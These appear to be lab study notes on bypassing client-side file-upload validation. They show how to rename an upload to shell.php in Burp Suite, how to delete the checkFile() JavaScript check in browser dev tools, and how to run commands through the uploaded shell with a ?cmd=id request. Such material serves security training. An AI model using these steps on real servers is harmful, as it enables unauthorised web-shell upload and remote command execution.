# Client-Side Validation

## Overview

Many web applications rely solely on front-end JavaScript validation to check file formats before upload. However, since this validation happens client-side, it can be easily bypassed by:
- Directly interacting with the server
- Modifying front-end code via browser dev tools

## The Problem

A typical file upload form restricts file types to images only:
- File dialog limited to `.jpg`, `.jpeg`, `.png`
- Error message: "Only images are allowed!"
- Upload button disabled for non-image files

However, no HTTP requests are sent during validation—all checks happen client-side.

## Solution 1: Back-end Request Modification

### Normal Upload Request
```
POST /upload.php
filename="HTB.png"
Content-Type: image/png
```

### Bypassing with Burp Suite

1. Capture the upload request with Burp
2. Modify `filename` to `shell.php`
3. Replace file content with PHP web shell
4. Send the modified request

**Result:** If back-end lacks validation, the PHP file uploads successfully.

```
POST /upload.php
filename="shell.php"
Response: 200 OK - File successfully uploaded
```

## Solution 2: Disabling Front-end Validation

### Step 1: Inspect the HTML
Press `[CTRL+SHIFT+C]` and click the upload element:

```html
<input type="file" name="uploadFile" id="uploadFile" 
    onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

### Step 2: Review the Validation Function
Open Console (`[CTRL+SHIFT+K]`) and examine the `checkFile()` function:

```javascript
function checkFile(File) {
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
     $('#error_message').text("Only images are allowed!");
     File.form.reset();
     $("#submit").attr("disabled", true);
    }
}
```

### Step 3: Remove Validation
- Double-click the `checkFile` function name in the inspector
- Delete it from the HTML
- (Optional) Remove the `accept` attribute as well

Now you can upload any file type without restrictions.

## Accessing the Uploaded Shell

After successful upload, inspect the profile image to find the shell URL:

```html
<img src="/profile_images/shell.php" class="profile-image">
```

Execute commands:
```
GET /profile_images/shell.php?cmd=id
```

**Note:** Client-side modifications are temporary and don't persist on page refresh, but that's sufficient to bypass validation once.
